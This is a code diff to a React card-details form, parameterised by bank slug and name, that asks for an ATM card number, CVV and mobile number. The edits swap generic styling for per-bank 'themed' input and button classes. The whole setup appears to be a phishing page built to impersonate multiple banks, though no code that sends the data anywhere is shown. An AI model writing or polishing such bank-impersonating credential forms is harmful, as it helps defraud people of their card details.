@@ -54,7 +54,7 @@ function TapSelect({
         aria-haspopup="listbox"
         aria-expanded={open}
         onClick={() => setOpen((prev) => !prev)}
-        className={`w-full rounded-2xl border border-border bg-card px-4 py-4 text-left text-base shadow-sm outline-none ring-2 ring-transparent transition-all duration-100 focus:ring-primary active:scale-[0.97] active:bg-secondary/60 ${
+        className={`bank-themed-input w-full rounded-2xl border px-4 py-4 text-left text-base shadow-sm outline-none ring-2 ring-transparent transition-all duration-100 active:scale-[0.97] active:bg-secondary/60 ${
           value ? 'text-foreground' : 'text-muted-foreground'
         }`}
       >
@@ -65,7 +65,7 @@ function TapSelect({
         <ul
           role="listbox"
           aria-label={label}
-          className="absolute left-0 right-0 top-full z-20 mt-2 max-h-56 overflow-y-auto rounded-2xl border border-border bg-card p-1 shadow-lg"
+          className="bank-themed-input absolute left-0 right-0 top-full z-20 mt-2 max-h-56 overflow-y-auto rounded-2xl border p-1 shadow-lg"
         >
           {options.map((option) => (
             <li key={option} role="option" aria-selected={option === value}>
@@ -152,7 +152,7 @@ export function CardDetailsForm({ slug, bankName }: { slug: string; bankName: st
           value={cardNumber}
           onChange={(e) => handleCardNumber(e.target.value)}
           placeholder="ATM Card Number (16 digits)"
-          className="w-full rounded-2xl border border-border bg-card px-5 py-4 text-base text-foreground shadow-sm outline-none ring-2 ring-transparent transition placeholder:text-muted-foreground focus:ring-primary"
+          className="bank-themed-input w-full rounded-2xl border px-5 py-4 text-base text-foreground shadow-sm outline-none ring-2 ring-transparent transition placeholder:text-muted-foreground"
         />
       </div>
 
@@ -187,7 +187,7 @@ export function CardDetailsForm({ slug, bankName }: { slug: string; bankName: st
             maxLength={3}
             onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 3))}
             placeholder="CVV"
-            className="w-full rounded-2xl border border-border bg-card px-4 py-4 text-base text-foreground shadow-sm outline-none ring-2 ring-transparent transition placeholder:text-muted-foreground focus:ring-primary"
+            className="bank-themed-input w-full rounded-2xl border px-4 py-4 text-base text-foreground shadow-sm outline-none ring-2 ring-transparent transition placeholder:text-muted-foreground"
           />
         </div>
       </div>
@@ -203,7 +203,7 @@ export function CardDetailsForm({ slug, bankName }: { slug: string; bankName: st
           value={mobile}
           onChange={(e) => setMobile(e.target.value.replace(/\D/g, '').slice(0, 11))}
           placeholder="Mobile Number (03XXXXXXXXX)"
-          className="w-full rounded-2xl border border-border bg-card px-5 py-4 text-base text-foreground shadow-sm outline-none ring-2 ring-transparent transition placeholder:text-muted-foreground focus:ring-primary"
+          className="bank-themed-input w-full rounded-2xl border px-5 py-4 text-base text-foreground shadow-sm outline-none ring-2 ring-transparent transition placeholder:text-muted-foreground"
         />
       </div>
 
@@ -226,7 +226,7 @@ export function CardDetailsForm({ slug, bankName }: { slug: string; bankName: st
       <button
         type="submit"
         disabled={!isValid}
-        className="flex w-full items-center justify-center gap-2 rounded-2xl bg-primary py-4 text-base font-bold text-primary-foreground shadow-md transition-all duration-100 hover:brightness-105 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring active:scale-[0.98] active:brightness-95 disabled:cursor-not-allowed disabled:opacity-50 disabled:active:scale-100"
+        className="bank-themed-button flex w-full items-center justify-center gap-2 rounded-2xl py-4 text-base font-bold shadow-md transition-all duration-100 hover:brightness-105 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring active:scale-[0.98] active:brightness-95 disabled:cursor-not-allowed disabled:opacity-50 disabled:active:scale-100"
       >
         Next
         <ChevronRight className="h-5 w-5" aria-hidden="true" />
